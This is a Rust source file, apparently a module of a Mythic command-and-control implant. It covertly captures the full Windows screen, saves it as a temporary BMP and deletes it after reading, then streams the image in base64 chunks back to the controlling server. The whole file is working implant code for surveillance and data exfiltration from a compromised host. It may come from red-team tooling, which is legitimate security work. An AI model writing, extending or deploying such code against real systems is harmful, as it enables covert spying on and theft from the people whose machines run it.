use crate::{AgentTask, mythic_success};
use crate::utils::unverbatim;
use base64::{Engine as _, engine::general_purpose};
use serde_json::json;
use std::error::Error;
use std::io::{Cursor, Read};
use std::result::Result;
use std::sync::mpsc;

#[cfg(target_os = "windows")]
use std::ptr;
#[cfg(target_os = "windows")]
use winapi::shared::windef::HBITMAP;
#[cfg(target_os = "windows")]
use winapi::um::wingdi::*;
#[cfg(target_os = "windows")]
use winapi::um::winuser::*;

/// Chunk size used for file transfer
const CHUNK_SIZE: usize = 512000;

#[cfg(target_os = "windows")]
use crate::utils::windows::whoami::hostname;

/// Response sent for initiating a download
#[derive(serde::Serialize)]
struct DownloadResponse<'a> {
    /// Total chunks in the download
    total_chunks: usize,
    /// Full path to the file to download
    full_path: Option<&'a str>,
    /// Host the downloaded file is from
    host: Option<String>,
    /// Optional extra filename for the file
    filename: Option<String>,
    /// Whether this download is a screenshot
    is_screenshot: bool,
    /// Size of each download chunk
    chunk_size: usize,
}

/// Information containing the chunk of the file being downloaded
#[derive(serde::Serialize)]
struct DownloadChunk<'a> {
    /// The current chunk being transferred
    chunk_num: usize,
    /// The file id associated with the download
    file_id: &'a str,
    /// The base64 encoded data of the file
    chunk_data: String,
    /// The size of the current chunk
    chunk_size: usize,
}

/// Take a screenshot and upload it to Mythic
/// * `tx` - Channel for sending information to Mythic
/// * `rx` - Channel for receiving information from Mythic
#[cfg(target_os = "windows")]
pub fn take_screenshot_upload(
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    // Parse the initial task information
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;

    // Capture screenshot
    let (file_path, filename) = execute_screenshot()
        .map_err(|e| Box::new(std::io::Error::other(e)) as Box<dyn Error>)?;

    let full_path = unverbatim(file_path.clone()).to_string_lossy().to_string();

    // Open the file and get the size
    let mut file = std::fs::File::open(&file_path)?;
    let file_len = file.metadata()?.len() as usize;

    // Calculate the total number of chunks
    let total_chunks = ((file_len as f64 / CHUNK_SIZE as f64).ceil()) as usize;

    // Metadata for the file upload
    let download_data = DownloadResponse {
        total_chunks,
        full_path: Some(&full_path),
        host: hostname(),
        is_screenshot: true,
        chunk_size: CHUNK_SIZE,
        filename: Some(filename),
    };

    // Send the file information up to Mythic
    tx.send(json!({
        "task_id": task.id,
        "download": download_data,
    }))?;

    // Read in the file data
    let mut file_data: Vec<u8> = Vec::new();
    file.read_to_end(&mut file_data)?;
    drop(file);

    // Clean up the temp file
    let _ = std::fs::remove_file(&file_path);

    // Create a cursor to traverse the file data
    let mut c = Cursor::new(file_data);

    // Get the response from Mythic containing the file id
    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    let params: crate::ContinuedData = serde_json::from_str(&task.parameters)?;
    let file_id: String = params
        .file_id
        .ok_or_else(|| std::io::Error::other("No file id"))?;

    // Iterate over the file data sending chunks
    for num in 0..total_chunks {
        let mut buffer: [u8; CHUNK_SIZE] = [0; CHUNK_SIZE];
        let len = c.read(&mut buffer)?;
        let chunk_data = general_purpose::STANDARD.encode(&buffer[..len]);

        let chunk_metadata = DownloadChunk {
            chunk_num: num + 1,
            chunk_size: len,
            file_id: &file_id,
            chunk_data,
        };

        tx.send(json!({
            "task_id": task.id,
            "download": chunk_metadata,
        }))?;

        let _: AgentTask = serde_json::from_value(rx.recv()?)?;
    }

    // Send success message
    let mut output = mythic_success!(task.id, format!("Screenshot uploaded: {}", file_id));
    let output = output.as_object_mut().unwrap();
    output.insert(
        "artifacts".to_string(),
        serde_json::json!([
            {
                "base_artifact": "Screenshot",
                "artifact": format!("Screenshot captured and uploaded"),
            }
        ]),
    );

    tx.send(serde_json::to_value(output)?)?;
    Ok(())
}

#[cfg(not(target_os = "windows"))]
pub fn take_screenshot_upload(
    _tx: &mpsc::Sender<serde_json::Value>,
    _rx: mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    Err("Screenshot is only supported on Windows".into())
}

/// Capture screenshot to file
/// Returns (file_path, filename)
#[cfg(target_os = "windows")]
fn execute_screenshot() -> Result<(std::path::PathBuf, String), String> {
    unsafe {
        let vx = GetSystemMetrics(SM_XVIRTUALSCREEN);
        let vy = GetSystemMetrics(SM_YVIRTUALSCREEN);
        let vw = GetSystemMetrics(SM_CXVIRTUALSCREEN);
        let vh = GetSystemMetrics(SM_CYVIRTUALSCREEN);

        if vw == 0 || vh == 0 {
            return Err("No screen available".to_string());
        }

        let hdc_screen = GetDC(ptr::null_mut());
        if hdc_screen.is_null() {
            return Err("GetDC failed".to_string());
        }

        let hdc_mem = CreateCompatibleDC(hdc_screen);
        let hbitmap = CreateCompatibleBitmap(hdc_screen, vw, vh);
        if hbitmap.is_null() {
            ReleaseDC(ptr::null_mut(), hdc_screen);
            return Err("CreateCompatibleBitmap failed".to_string());
        }

        SelectObject(hdc_mem, hbitmap as *mut _);
        let res = BitBlt(
            hdc_mem,
            0,
            0,
            vw,
            vh,
            hdc_screen,
            vx,
            vy,
            SRCCOPY | CAPTUREBLT,
        );
        if res == 0 {
            DeleteObject(hbitmap as *mut _);
            DeleteDC(hdc_mem);
            ReleaseDC(ptr::null_mut(), hdc_screen);
            return Err("BitBlt failed".to_string());
        }

        let filename = format!("screenshot_{}.bmp", chrono::Utc::now().timestamp());
        let file_path = std::env::temp_dir().join(&filename);
        save_bitmap_to_file(hbitmap, vw as u32, vh as u32, &file_path)?;

        DeleteObject(hbitmap as *mut _);
        DeleteDC(hdc_mem);
        ReleaseDC(ptr::null_mut(), hdc_screen);

        Ok((file_path, filename))
    }
}

#[cfg(target_os = "windows")]
unsafe fn save_bitmap_to_file(hbitmap: HBITMAP, width: u32, height: u32, file_path: &std::path::Path) -> Result<(), String> {
    use std::fs::File;
    use std::io::Write;

    let bits_per_pixel = 24;
    let bytes_per_pixel = bits_per_pixel / 8;
    let row_size = ((width * bytes_per_pixel + 3) / 4) * 4;
    let image_size = row_size * height;
    let file_size = 14 + 40 + image_size;

    let mut bmp_header = vec![0u8; 14];
    bmp_header[0] = b'B';
    bmp_header[1] = b'M';
    bmp_header[2..6].copy_from_slice(&file_size.to_le_bytes());
    bmp_header[10..14].copy_from_slice(&54u32.to_le_bytes());

    let mut info_header = vec![0u8; 40];
    info_header[0..4].copy_from_slice(&40u32.to_le_bytes());
    info_header[4..8].copy_from_slice(&(width as i32).to_le_bytes());
    info_header[8..12].copy_from_slice(&(height as i32).to_le_bytes());
    info_header[12..14].copy_from_slice(&1u16.to_le_bytes());
    info_header[14..16].copy_from_slice(&(bits_per_pixel as u16).to_le_bytes());
    info_header[20..24].copy_from_slice(&image_size.to_le_bytes());

    let mut pixels = vec![0u8; image_size as usize];
    let hdc = GetDC(ptr::null_mut());
    let mut bmp_info = BITMAPINFO {
        bmiHeader: BITMAPINFOHEADER {
            biSize: 40,
            biWidth: width as i32,
            biHeight: height as i32,
            biPlanes: 1,
            biBitCount: bits_per_pixel as u16,
            biCompression: BI_RGB,
            biSizeImage: image_size,
            biXPelsPerMeter: 0,
            biYPelsPerMeter: 0,
            biClrUsed: 0,
            biClrImportant: 0,
        },
        bmiColors: [RGBQUAD {
            rgbBlue: 0,
            rgbGreen: 0,
            rgbRed: 0,
            rgbReserved: 0,
        }],
    };

    let res = GetDIBits(
        hdc,
        hbitmap,
        0,
        height,
        pixels.as_mut_ptr() as *mut _,
        &mut bmp_info,
        DIB_RGB_COLORS,
    );

    ReleaseDC(ptr::null_mut(), hdc);
    if res == 0 {
        return Err("GetDIBits failed".into());
    }

    let mut file = File::create(file_path)
        .map_err(|e| format!("Create file failed: {}", e))?;
    file.write_all(&bmp_header).unwrap();
    file.write_all(&info_header).unwrap();
    file.write_all(&pixels).unwrap();
    Ok(())
}
